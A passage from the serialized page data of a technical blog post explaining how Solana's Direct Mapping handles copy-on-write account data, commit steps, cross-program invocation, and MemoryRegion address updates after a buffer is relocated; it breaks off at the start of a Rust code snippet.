,\"$L4e8\",\"$L4e9\",\"$L4ea\",\"$L4eb\",\"$L4ec\",\"$L4ed\",\"$L4ee\",\"$L4ef\",\"$L4f0\",\"$L4f1\",\"$L4f2\",\"$L4f3\",\"$L4f4\",\"$L4f5\",\"$L4f6\",\"$L4f7\",\"$L4f8\",\"$L4f9\",\"$L4fa\",\"$L4fb\",\"$L4fc\",\"$L4fd\",\"$L4fe\",\"$L4ff\",\"$L500\",\"$L501\",\"$L502\",\"$L503\",\"$L504\",\"$L505\",\"$L506\",\"$L507\",\"$L508\",\"$L509\",\"$L50a\",\"$L50b\",\"$L50c\",\"$L50d\",\"$L50e\",\"$L50f\",\"$L510\",\"$L511\",\"$L512\",\"$L513\",\"$L514\",\"$L515\",\"$L516\",\"$L517\",\"$L518\",\"$L519\",\"$L51a\",\"$L51b\",\"$L51c\",\"$L51d\",\"$L51e\",\"$L51f\",\"$L520\",\"$L521\",\"$L522\",\"$L523\",\"$L524\",\"$L525\",\"$L526\",\"$L527\",\"$L528\",\"$L529\",\"$L52a\",\"$L52b\",\"$L52c\",\"$L52d\",\"$L52e\",\"$L52f\",\"$L530\",\"$L531\",\"\\n\",\"$L532\",\"$L533\",\"$L534\",\"$L535\",\"$L536\",\"$L537\",\"$L538\",\"$L539\",\"$L53a\",\"$L53b\",\"$L53c\",\"$L53d\",\"$L53e\",\"$L53f\",\"$L540\",\"$L541\",\"$L542\",\"$L543\",\"$L544\",\"$L545\",\"$L546\",\"$L547\",\"$L548\",\"$L549\",\"$L54a\",\"$L54b\",\"$L54c\",\"$L54d\",\"$L54e\",\"$L54f\",\"$L550\",\"$L551\",\"$L552\",\"$L553\",\"$L554\",\"$L555\",\"$L556\",\"$L557\",\"$L558\",\"$L559\",\"$L55a\",\"$L55b\",\"$L55c\",\"$L55d\",\"$L55e\",\"$L55f\",\"$L560\",\"$L561\",\"$L562\",\"$L563\",\"$L564\",\"$L565\",\"$L566\",\"$L567\",\"$L568\",\"$L569\",\"$L56a\",\"$L56b\",\"$L56c\",\"$L56d\",\"$L56e\",\"$L56f\",\"$L570\",\"$L571\",\"$L572\",\"$L573\",\"$L574\",\"$L575\",\"$L576\",\"$L577\",\"$L578\",\"$L579\",\"$L57a\",\"$L57b\",\"$L57c\",\"$L57d\",\"$L57e\",\"$L57f\",\"$L580\",\"$L581\",\"$L582\",\"$L583\",\"$L584\",\"\\n\",\"$L585\",\"$L586\",\"$L587\",\"$L588\",\"$L589\",\"$L58a\",\"$L58b\",\"$L58c\",\"$L58d\",\"$L58e\",\"$L58f\",\"$L590\",\"$L591\",\"$L592\",\"$L593\",\"$L594\",\"$L595\",\"$L596\",\"$L597\",\"$L598\",\"$L599\",\"$L59a\",\"$L59b\",\"$L59c\",\"$L59d\",\"$L59e\",\"\\n\",\"$L59f\",\"$L5a0\",\"$L5a1\",\"$L5a2\",\"$L5a3\",\"$L5a4\",\"$L5a5\",\"$L5a6\",\"$L5a7\",\"$L5a8\",\"$L5a9\",\"$L5aa\",\"$L5ab\",\"$L5ac\",\"$L5ad\",\"$L5ae\",\"$L5af\",\"$L5b0\",\"$L5b1\",\"$L5b2\",\"$L5b3\",\"$L5b4\",\"$L5b5\",\"$L5b6\",\"\\n\",\"$L5b7\",\"$L5b8\",\"$L5b9\",\"$L5ba\",\"$L5bb\",\"$L5bc\",\"$L5bd\",\"$L5be\",\"$L5bf\",\"$L5c0\",\"$L5c1\",\"$L5c2\",\"$L5c3\",\"$L5c4\",\"$L5c5\",\"$L5c6\",\"$L5c7\",\"$L5c8\",\"$L5c9\",\"$L5ca\",\"$L5cb\",\"$L5cc\",\"$L5cd\",\"$L5ce\",\"$L5cf\",\"$L5d0\",\"$L5d1\",\"$L5d2\",\"$L5d3\",\"$L5d4\",\"$L5d5\",\"$L5d6\",\"$L5d7\",\"$L5d8\",\"$L5d9\",\"$L5da\",\"$L5db\",\"$L5dc\",\"$L5dd\",\"$L5de\",\"$L5df\",\"$L5e0\",\"$L5e1\",\"$L5e2\",\"$L5e3\",\"$L5e4\",\"$L5e5\",\"$L5e6\",\"$L5e7\",\"$L5e8\",\"$L5e9\",\"$L5ea\",\"$L5eb\",\"$L5ec\",\"$L5ed\",\"$L5ee\",\"$L5ef\",\"$L5f0\",\"$L5f1\",\"$L5f2\",\"$L5f3\",\"$L5f4\",\"$L5f5\",\"$L5f6\",\"$L5f7\",\"$L5f8\",\"$L5f9\",\"$L5fa\",\"$L5fb\",\"$L5fc\",\"$L5fd\",\"$L5fe\",\"$L5ff\",\"$L600\",\"$L601\",\"$L602\",\"$L603\",\"$L604\",\"$L605\",\"$L606\",\"$L607\",\"$L608\",\"$L609\",\"$L60a\",\"$L60b\",\"$L60c\",\"$L60d\",\"$L60e\",\"$L60f\",\"$L610\",\"$L611\",\"$L612\",\"$L613\",\"$L614\",\"$L615\",\"$L616\",\"$L617\",\"$L618\",\"$L619\",\"$L61a\",\"$L61b\",\"$L61c\",\"$L61d\",\"$L61e\",\"$L61f\",\"$L620\",\"$L621\",\"$L622\",\"$L623\",\"$L624\",\"$L625\",\"$L626\",\"$L627\",\"$L628\",\"$L629\",\"$L62a\",\"$L62b\",\"$L62c\",\"$L62d\",\"$L62e\",\"$L62f\",\"$L630\",\"$L631\",\"$L632\",\"$L633\",\"$L634\",\"                region\\n\",\"$L635\",\"$L636\",\"$L637\",\"$L638\",\"$L639\",\"$L63a\",\"$L63b\",\"$L63c\",\"$L63d\",\"$L63e\",\"$L63f\",\"$L640\",\"$L641\",\"$L642\",\"$L643\",\"$L644\",\"$L645\",\"$L646\",\"$L647\",\"$L648\",\"$L649\",\"$L64a\",\"$L64b\",\"$L64c\",\"$L64d\",\"$L64e\",\"$L64f\",\"$L650\",\"$L651\",\"$L652\",\"$L653\",\"$L654\",\"$L655\",\"$L656\",\"$L657\",\"$L658\",\"$L659\",\"$L65a\",\"$L65b\",\"$L65c\",\"$L65d\",\"$L65e\",\"\\n\",\"$L65f\",\"$L660\",\"$L661\",\"$L662\",\"$L663\",\"$L664\",\"$L665\",\"$L666\",\"$L667\",\"$L668\",\"$L669\",\"$L66a\",\"$L66b\",\"$L66c\",\"$L66d\",\"$L66e\",\"$L66f\",\"$L670\",\"$L671\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"87:[\"$\",\"h3\",\"h3-16\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Commit Process Changes\"}]\n88:[\"$\",\"p\",\"p-78\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"The new CoW strategy also changes how account data is committed due to the mapping constraints:\"}]\n89:[\"$\",\"p\",\"p-79\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"Directly Mapped Data\"}],\": The original data length portion has already been modified through direct mapping and requires no additional copying.\"]}]\n"])</script><script>self.__next_f.push([1,"8a:[\"$\",\"p\",\"p-80\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"Growth Area Data\"}],\": When programs expand account data using \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"realloc()\"}],\", the new data initially lives in the reserved buffer space within the \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" section. Since the reserved buffer isn't mapped to host memory (we can only map the exact current data size), an additional copy operation is required to move growth data from the unmapped reserved buffer to the actual account data buffer in host memory.\"]}]\n"])</script><script>self.__next_f.push([1,"8b:[\"$\",\"p\",\"p-81\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"This mapping constraint means that while Direct Mapping eliminates copying for existing data, growth scenarios still require copying from the unmapped reserved space.\"}]\n8c:[\"$\",\"h3\",\"h3-17\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Impact on Cross-Program Invocation\"}]\n8d:[\"$\",\"p\",\"p-82\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"With data writes handled, the next thing to understand is how CPI works under the new design.\"}]\n8e:[\"$\",\"h4\",\"h4-9\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"CPI Call Process\"}]\n8f:[\"$\",\"p\",\"p-83\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"The CPI call process remains quite similar to the original design. Most steps are unchanged:\"}]\n"])</script><script>self.__next_f.push([1,"90:[\"$\",\"ol\",\"ol-0\",{\"className\":\"text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-decimal pl-6\",\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"className\":\"my-2\",\"children\":\"Retrieve metadata of accounts involved in the CPI instruction\"}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"className\":\"my-2\",\"children\":[\"Look up corresponding \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" from the TransactionContext\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"className\":\"my-2\",\"children\":[\"Translate guest addresses in \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo\"}],\" into host pointers to construct \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"CallerAccount\"}],\" structures\"]}],\"\\n\",[\"$\",\"li\",\"li-3\",{\"className\":\"my-2\",\"children\":[\"Update reserved buffer and validate account changes and write them back to \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}]]}],\"\\n\",[\"$\",\"li\",\"li-4\",{\"className\":\"my-2\",\"children\":[\"Serialize \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" into callee program's \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" section\"]}],\"\\n\"]}]\n"])</script><script>self.__next_f.push([1,"91:[\"$\",\"p\",\"p-84\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"A minor difference is, before step 4 validation, instead of copying the entire account data, we only copy newly grown data that's still in the reserved buffer back to the newly allocated direct-mapped buffer and verify other fields then write them back into \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\".\"]}]\n92:[\"$\",\"p\",\"p-85\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"$\",\"span\",\"img-0\",{\"className\":\"block my-8\",\"children\":[\"$\",\"img\",null,{\"className\":\"mx-auto\",\"src\":\"/blog/2025_06_27/new_cpi_call.png\",\"alt\":\"New CPI Call\"}]}]}]\n93:[\"$\",\"h4\",\"h4-10\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"CPI Return Process\"}]\n94:[\"$\",\"p\",\"p-86\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"The major differences occur when returning from a CPI call. Since we're using direct mapping, Vector CoW operations might occur during nested calls, requiring us to check if the original data buffer mapping has been relocated.\"}]\n"])</script><script>self.__next_f.push([1,"95:[\"$\",\"p\",\"p-87\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"1-1. Copy data from reserved buffer back to the directly mapped data buffer.\\n1-2. Validate all account changes using the same rules as single program execution\\n2. Check if data buffer was relocated during CoW operations, if relocation occurred, update the parent's \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion.host_addr\"}],\" to reflect the change\\n3. Ensure the account data length hasn't exceeded the limits expected by the caller program\\n4. Write the consolidated account changes back into the parent program's \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" region\"]}]\n"])</script><script>self.__next_f.push([1,"96:[\"$\",\"p\",\"p-88\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Notably, steps 2 is a new action introduced by Direct Mapping. Since Vector CoW operations might occur during nested calls, we must detect buffer relocations and update memory mappings to maintain consistency.\"}]\n97:[\"$\",\"p\",\"p-89\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"$\",\"span\",\"img-0\",{\"className\":\"block my-8\",\"children\":[\"$\",\"img\",null,{\"className\":\"mx-auto\",\"src\":\"/blog/2025_06_27/new_cpi_return.png\",\"alt\":\"New CPI Return\"}]}]}]\n98:[\"$\",\"h3\",\"h3-18\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":[\"The \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" Update Mechanism\"]}]\n99:[\"$\",\"p\",\"p-90\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"When CoW operations relocate account data buffers during CPI execution, the parent program's \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegions\"}],\" still point to the old buffer locations, we need to update it to reflect the change. So how exactly does the update mechanism look like?\"]}]\n"])</script><script>self.__next_f.push([1,"9a:[\"$\",\"p\",\"p-91\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" manage virtual-to-host address mappings, with each region covering non-overlapping virtual address ranges. When a buffer gets relocated, we need to identify which specific \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" needs updating and modify its \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\" to point to the new location.\"]}]\n"])</script><script>self.__next_f.push([1,"9b:[\"$\",\"p\",\"p-92\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Solana uses the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"vm_data_addr\"}],\" field stored in \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"CallerAccount\"}],\" to locate the correct \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\":\"]}]\n"])</script><script>self.__next_f.push([1,"9c:[\"$\",\"ol\",\"ol-1\",{\"className\":\"text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-decimal pl-6\",\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"className\":\"my-2\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"Locate the Target Region\"}],\": Use \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"vm_data_addr\"}],\" to find the \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" that maps the account's data. This address should correspond to a virtual address within one of the \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\"'s ranges.\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"className\":\"my-2\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"Compare Buffer Addresses\"}],\": Check if the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\"'s current \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\" matches the account's actual data buffer address in \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\". If they differ, a relocation occurred during CoW operations.\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"className\":\"my-2\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"Update the Mapping\"}],\": Replace the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\"'s \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\" with the new buffer address from \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\", ensuring future VM memory accesses resolve to the correct location.\"]}],\"\\n\",[\"$\",\"li\",\"li-3\",{\"className\":\"my-2\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"className\":\"font-semibold text-white\",\"children\":\"Complete the Update\"}],\": After updating \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"host_addr\"}],\", when the parent program accesses memory at the same virtual address, it will now correctly resolve to the relocated buffer location.\"]}],\"\\n\"]}]\n"])</script><script>self.__next_f.push([1,"9d:[\"$\",\"p\",\"p-93\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"$\",\"span\",\"img-0\",{\"className\":\"block my-8\",\"children\":[\"$\",\"img\",null,{\"className\":\"mx-auto\",\"src\":\"/blog/2025_06_27/memoryregion_update.png\",\"alt\":\"MemoryRegion Update\"}]}]}]\n9e:[\"$\",\"p\",\"p-94\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"This mechanism relies on an assumption: that \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"vm_data_addr\"}],\" accurately identifies the correct \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"MemoryRegion\"}],\" to update.\"]}]\n9f:[\"$\",\"p\",\"p-95\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The code of searching for a region containing some specific \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"vm_addr\"}],\" is shown here\"]}]\n"])</script><script>self.__next_f.push([1,"a0:[\"$\",\"pre\",\"pre-10\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"impl\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"UnalignedMemoryMapping\"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-9\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"find_region\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token 